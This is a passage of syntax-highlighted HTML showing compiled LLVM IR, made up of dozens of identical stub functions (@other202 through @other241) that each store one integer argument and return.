class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other202</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other203</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other204</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other205</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other206</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other207</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other208</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other209</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other210</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other211</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other212</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other213</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other214</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other215</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other216</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other217</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other218</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other219</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other220</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other221</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other222</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other223</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other224</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other225</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other226</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other227</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other228</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other229</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other230</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other231</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other232</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other233</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other234</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other235</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other236</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other237</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other238</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other239</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other240</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other241</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other242</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span 